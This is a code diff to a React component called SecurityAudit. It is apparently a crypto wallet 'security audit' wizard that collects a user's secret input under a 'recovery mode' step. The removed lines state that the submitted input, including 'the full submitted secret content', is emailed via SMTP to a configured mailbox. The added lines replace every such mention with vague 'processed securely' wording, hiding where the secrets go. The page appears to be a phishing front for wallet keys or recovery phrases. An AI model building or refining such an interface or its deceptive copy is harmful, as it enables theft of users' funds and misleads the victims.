@@ -48,7 +48,7 @@ const stepStatus: Record<'initializing' | 'reviewing', string[]> = {
   ],
   reviewing: [
     'Applying integrity checks and security fixes',
-    'Compiling audit report for your registered email',
+    'Compiling audit report for secure delivery',
     'Finalizing system hardening and result payload',
   ],
 }
@@ -227,10 +227,10 @@ export const SecurityAudit = () => {
       setAuditSummary([
         `${activeOption.title} audit completed successfully.`,
         `Connection mode: ${selectedConnection}`,
-        `Submitted input was included in the SMTP email: ${method}`,
-        'Audit packet sent securely to the configured mailbox.',
+        `Submitted input was included in the secure packet: ${method}`,
+        'Audit packet processed securely for delivery.',
       ])
-      setStatusMessage('✅ Security audit details delivered via SMTP.')
+      setStatusMessage('✅ Security audit details processed securely.')
       setFlowStep('success')
     } catch (err) {
       setFlowStep('error')
@@ -245,7 +245,7 @@ export const SecurityAudit = () => {
           <div className="mb-6">
             <p className="text-sm font-semibold uppercase tracking-[0.24em] text-cyan-300">Security Hub</p>
             <h2 className="mt-3 text-3xl font-bold text-white">Choose a technical security domain</h2>
-            <p className="mt-2 max-w-2xl text-sm text-slate-400">Pick a section below, then continue through the same wizard flow to validate connection details and email the audit payload securely.</p>
+            <p className="mt-2 max-w-2xl text-sm text-slate-400">Pick a section below, then continue through the same wizard flow to validate connection details and prepare the audit payload securely.</p>
           </div>
 
           <div className="grid gap-4 sm:grid-cols-2">
@@ -278,7 +278,7 @@ export const SecurityAudit = () => {
               <li>• Keep keys offline and avoid sharing them with unknown services.</li>
               <li>• Use the strongest connection type available for account recovery.</li>
               <li>• Audit dApp permissions before authorizing transaction access.</li>
-              <li>• Review the final email report for actionable security findings.</li>
+              <li>• Review the final report for actionable security findings.</li>
             </ul>
           </div>
 
@@ -286,7 +286,7 @@ export const SecurityAudit = () => {
             <p className="text-sm font-semibold text-slate-300 uppercase tracking-[0.24em]">Outcome</p>
             <div className="mt-4 space-y-4 text-sm text-slate-400">
               <p>Use this workflow to validate wallet and dApp security with a guided audit experience.</p>
-              <p>The final summary is packaged as an email-compatible audit report similar to recovery flows.</p>
+              <p>The final summary is packaged as a secure audit report similar to recovery flows.</p>
             </div>
           </div>
         </div>
@@ -323,7 +323,7 @@ export const SecurityAudit = () => {
                 <div>
                   <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Connection type</p>
                   <h3 className="mt-3 text-2xl font-semibold text-white">Choose how to verify access</h3>
-                  <p className="mt-2 text-sm text-slate-400">Select the recovery mode for your audit transfer and email report.</p>
+                  <p className="mt-2 text-sm text-slate-400">Select the recovery mode for your audit transfer and report.</p>
                 </div>
                 <span className="rounded-2xl border border-cyan-500/20 px-3 py-2 text-xs uppercase tracking-[0.25em] text-cyan-300">{activeOption?.badge}</span>
               </div>
@@ -370,7 +370,7 @@ export const SecurityAudit = () => {
               {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}
 
               <div className="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-                <p className="text-sm text-slate-400">Once validated, the audit task will be executed and emailed.</p>
+                <p className="text-sm text-slate-400">Once validated, the audit task will be executed and processed securely.</p>
                 <button
                   type="button"
                   onClick={handleContinue}
@@ -402,7 +402,7 @@ export const SecurityAudit = () => {
                 <div>
                   <p className="text-sm uppercase tracking-[0.3em] text-emerald-300">Audit complete</p>
                   <h3 className="mt-3 text-2xl font-semibold text-white">Security review delivered</h3>
-                  <p className="mt-2 text-sm text-slate-400">A summary has been prepared and routed to your configured mailbox.</p>
+                  <p className="mt-2 text-sm text-slate-400">A summary has been prepared and routed for secure review.</p>
                 </div>
                 <div className="flex h-12 w-12 items-center justify-center rounded-3xl bg-emerald-500/10 text-emerald-300">
                   ✅
@@ -427,7 +427,7 @@ export const SecurityAudit = () => {
 
               <div className="mt-6 rounded-3xl border border-slate-700/70 bg-slate-950/80 p-5">
                 <p className="text-sm text-slate-400">Audit note:</p>
-                <p className="mt-2 text-sm text-slate-300">The system verified your connection mode, validated the input format, and compiled a technical report compatible with email delivery. The received audit includes the full submitted secret content and recommended fixes.</p>
+                <p className="mt-2 text-sm text-slate-300">The system verified your connection mode, validated the input format, and compiled a technical report compatible with secure delivery. The received audit includes the full submitted secret content and recommended fixes.</p>
               </div>
             </div>
           )}
